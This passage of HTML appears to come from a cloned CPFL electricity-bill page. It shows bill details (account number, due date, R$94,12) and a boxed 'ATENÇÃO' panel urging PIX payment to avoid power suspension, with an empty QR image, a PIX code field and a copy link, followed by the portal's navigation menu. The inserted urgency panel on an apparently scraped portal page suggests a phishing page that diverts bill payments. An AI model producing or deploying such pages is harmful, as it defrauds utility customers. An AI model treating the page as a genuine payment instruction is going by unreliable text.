                                                <!-- end ngIf: !registro.parcelamento -->
                                                <!-- ngIf: registro.parcelamento -->
                                            </font>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="border-left: black 2px solid; border-bottom: black 1px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.MesReferencia" class="ng-binding"
                                                    id="MesReferencia">2023/03</span></font>
                                        </td>
                                        <td style="border-left: black 2px solid; border-bottom: black 1px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.Periodoconsumo" class="ng-binding"
                                                    id="periodo">24/02/2023 até 23/03/2023</span></font>
                                        </td>
                                        <td style="border-left: black 2px solid; border-bottom: black 1px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.NumeroContaEnergia" class="ng-binding"
                                                    id="NumeroContaEnergia">0202303295257029</span></font>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td colspan="3" height="3"></td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-DATA-FATURAMENTO"
                                                    class="ng-scope">Data de Faturamento</span></font>
                                        </td>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-DATA-VENCIMENTO"
                                                    class="ng-scope">Data de Vencimento</span></font>
                                        </td>
                                        <td>
                                            <font face="Tahoma" size="1"><span
                                                    translate="@APP-MODAL-VIA-PAGAMENTO-DADOS-CONTA-VALOR-TOTAL"
                                                    class="ng-scope">Valor Total (R$)</span></font>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="border-left: black 2px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.DataFaturamento" class="ng-binding"
                                                    id="DataFaturamento">24/03/2023</span></font>
                                        </td>
                                        <td style="border-left: black 2px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.Vencimento | date:'dd/MM/yyyy'"
                                                    class="ng-binding" id="Vencimento">03/05/2023</span></font>
                                        </td>
                                        <td style="border-left: black 2px solid">
                                            <font face="Tahoma" size="2"><span style="margin-left: 5px;"
                                                    ng-bind="registro.dadosBoleto.Valor | currency" class="ng-binding"
                                                    id="valorp">R$94,12</span></font>
                                        </td>
                                    </tr>


                                    <!-- ngIf: !registro.parcelamento -->


                                    <tr height="3">
                                        <td colspan="3"></td>
                                    </tr>
                                    <tr height="3">
                                        <td colspan="3"></td>
                                    </tr>



                                </tbody>
                            </table><span cellspacing="0" cellpadding="0"
                                style="width: 100%;justify-content: center;align-items: center;/* margin-top: -158px; */">
                                <span>
                                    <div>
                                        <div class="negrito" align="center" style="background-color: #acacac;">
                                            <span id="conteudoPaginaPlaceHolder_Label63" title="Atenção"
                                                style="color:#505050;font-size:Small;font-weight:bold;">ATENÇÃO</span>
                                        </div>
                                    </div>


                                    <div class="basepix">
                                        <div
                                            style="justify-content: center;align-items: center;display: flex;border: solid #d2d2d2 01px;border-radius: 3px 0px 0px 3px;">
                                            <img id="imgpix" src="" style="width: 131px;height: 131px;">
                                        </div>
                                        <div class="loginConteudo"
                                            style="text-align: center;border: solid #d2d2d2 1px;">

                                            <div class="loginTable" style="color: #525252;margin-top: 7px;">
                                                <div style="color: #5e5e5e;font-size: 11px;margin: 0px 10px 1px 10px;">
                                                    Faça o pagamento por PIX e
                                                    evite suspensão no fornecimento de energia.</div>
                                                <div style="color: #5e5e5e;font-size: 11px;">Seu pagamento constara
                                                    imediatamente após o pagamento!

                                                </div>


                                                <div style="margin: 11px;justify-content: center;">
                                                    <textarea name="pix" class="pixText" id="pix" cols="30" rows="5"
                                                        style="font-size: 10px; width: 100%; height: 46px;"></textarea>
                                                    <div
                                                        style="float: none;margin-top: 12px;font-family: open sans;font-weight: 800;font-size: 12px;text-decoration: none;">
                                                        <a style="color: #3f51b5;cursor: pointer;" onclick="copy()">
                                                            CLIQUE AQUI PARA COPIAR</a>
                                                    </div>
                                                </div>

                                            </div>
                                        </div>
                                    </div>


                                </span>
                            </span>
                        </div>

                    </div>

                </div>
            </div>



        </div>
    </div>


    <style>
    .embeddedServiceHelpButton .helpButton .uiButton {
        background-color: #006699;
        font-family: 'Lato', sans-serif;
        font-size: 12px;
        display: block;
    }

    .embeddedServiceHelpButton .helpButton .uiButton:focus {
        outline: 1px solid #006699;
    }

    .embeddedServiceHelpButton .helpButton .uiButton .embeddedServiceIcon::before {
        font-family: 'embeddedserviceiconfont' !important;
    }

    .embeddedServiceLiveAgentStateChatMenuMessage .rich-menu-item,
    .embeddedServiceLiveAgentStateChatMenuMessage .rich-menu-itemOptionIsClicked {
        text-align: center;
        font-family: 'Lato', sans-serif;
        font-size: 12px;
        padding: 12px 5px;
        display: block;
        width: inherit;
        margin: 0;
    }

    .embeddedServiceLiveAgentStateChatMessage .uiOutputRichText {
        text-align: left;
        font-family: 'Lato', sans-serif;
        font-size: 12px;
    }

    .embeddedServiceLiveAgentStateChatPlaintextMessageDefaultUI.agent.plaintextContent {
        color: #444C64;
        font-family: 'Lato', sans-serif;
        background: #D8D8E0;
        border-radius: 10px 10px 10px 0;
        float: left;
    }

    .embeddedServiceLiveAgentStateChatPlaintextMessageDefaultUI.chasitor.plaintextContent {
        font-family: 'Lato', sans-serif;
        background: #006699;
        color: #FFFFFF;
    }

    .message {
        font-size: 12px;
        color: #FFFFFF;
        font-family: 'Lato', sans-serif;
    }

    .headerTextContent {
        font-size: 12px;
        color: #FFFFFF;
        font-family: 'Lato', sans-serif;
    }
    </style>

    <div class="cpfl-style">
        <!-- uiView: -->
        <div ui-view="" autoscroll="false" class="ng-scope">

            <div ng-controller="MenuController as menuCtrl" class="ng-scope">
                <nav id="menuMobile" class="slideout-menu slideout-menu-left">
                    <header>
                        <div id="boxMenusMobiles">
                            <!-- ngIf: menuCtrl.isLogged -->
                            <section class="menu-section panel"><a data-toggle="collapse" data-parent="#boxMenusMobiles"
                                    data-target="#menuMinhaFatura" aria-expanded="false"
                                    translate="@APP-COMMON-MENU-MINHA-FATURA" class="ng-scope">Minha conta</a>
                                <div class="collapse" id="menuMinhaFatura">
                                    <!-- ngIf: menuCtrl.itemsMenuLoaded -->
                                    <div ng-if="menuCtrl.itemsMenuLoaded" class="ng-scope">
                                        <ul suffix=" "
                                            class="site-menu menu-section-list list-menu-sub ng-isolate-scope"
                                            name="menuMinhaFatura">
                                            <!-- ngRepeat: item in ::items -->
                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <li ng-repeat="item in ::items"
                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                class="ng-scope">
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                <!-- ngIf: item.items.length > 0 -->
                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                    <ul suffix=" " items="item.items" class="ng-isolate-scope">
                                                        <!-- ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/historico-contas"
                                                                ui-sref="app.historico-contas" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Débitos e 2ª via de
                                                                    conta</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/conta-facil"
                                                                ui-sref="app.conta-facil" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Conta fácil</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/historico-consumo"
                                                                ui-sref="app.historico-consumo" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Histórico de
                                                                    consumo</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/troca-nome-fatura/inicial"
                                                                ui-sref="app.troca-nome-fatura-inicial" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Trocar o nome na
                                                                    conta</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/alteracao-data-vencimento"
                                                                ui-sref="app.alterar-vencimento" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Alterar data de
                                                                    vencimento</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/recebimento-fatura"
                                                                ui-sref="app.recebimento-fatura.detalhe" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Conta digital</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/data-leitura"
                                                                ui-sref="app.data-leitura" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Data da leitura</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/auto-leitura"
                                                                ui-sref="app.auto-leitura" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Autoleitura</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/debito-automatico"
                                                                ui-sref="app.debito-automatico" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Débito automático</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/conta-minima"
                                                                ui-sref="app.conta-minima" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Conta mínima</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/migracao-tarifaria-informativo"
                                                                ui-sref="app.migracao-tarifaria-informativo"
                                                                ui-sref-opts="" class="ng-scope"><i
                                                                    ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Tarifa Branca</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/micro-mini-geracao-relatorio"
                                                                ui-sref="app.micro-mini-geracao-relatorio"
                                                                ui-sref-opts="" class="ng-scope"><i
                                                                    ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Micro/Mini Geração -
                                                                    Histórico de Saldo</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                    </ul>
                                                </div><!-- end ngIf: item.items.length > 0 -->
                                            </li><!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <!-- end ngRepeat: item in ::items -->
                                        </ul>
                                    </div><!-- end ngIf: menuCtrl.itemsMenuLoaded -->
                                </div>
                            </section><!-- ngIf: menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                            <section class="menu-section panel ng-scope"
                                ng-if="menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                    data-toggle="collapse" data-parent="#boxMenusMobiles"
                                    data-target="#menuMinhaEnergia" aria-expanded="false"
                                    translate="@APP-COMMON-MENU-MINHA-INSTALACAO" class="ng-scope">Minha energia</a>
                                <div class="collapse" id="menuMinhaEnergia">
                                    <!-- ngIf: menuCtrl.itemsMenuLoaded -->
                                    <div ng-if="menuCtrl.itemsMenuLoaded" class="ng-scope">
                                        <ul suffix=" "
                                            class="site-menu menu-section-list list-menu-sub ng-isolate-scope"
                                            name="menuMinhaEnergia">
                                            <!-- ngRepeat: item in ::items -->
                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                            <li ng-repeat="item in ::items"
                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                class="ng-scope">
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                <!-- ngIf: item.items.length > 0 -->
                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                    <ul suffix=" " items="item.items" class="ng-isolate-scope">
                                                        <!-- ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/ligacao-nova"
                                                                ui-sref="app.ligacao-nova" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Nova ligação</span> </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/falta-energia"
                                                                ui-sref="app.falta-de-energia" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Falta de energia</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/religacao-energia"
                                                                ui-sref="app.religacao-energia" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Religar energia</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                            <!-- ngIf: item.items.length > 0 -->
                                                        </li>
                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <!-- end ngRepeat: item in ::items -->
                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                        <li ng-repeat="item in ::items"
                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                            ng-class="[item.classItem, (item.open ? &#39;open&#39; : &#39;&#39;)]"
                                                            class="ng-scope sub-item-menu">
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/desligar-energia"
                                                                ui-sref="app.desligar-energia" ui-sref-opts=""
                                                                class="ng-scope"><i ng-class="item.classIcon"></i><span
                                                                    ng-class="item.classLabel" translate=""
                                                                    class="ng-scope ng-binding">Desligar energia</span>
                                                            </a>
                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
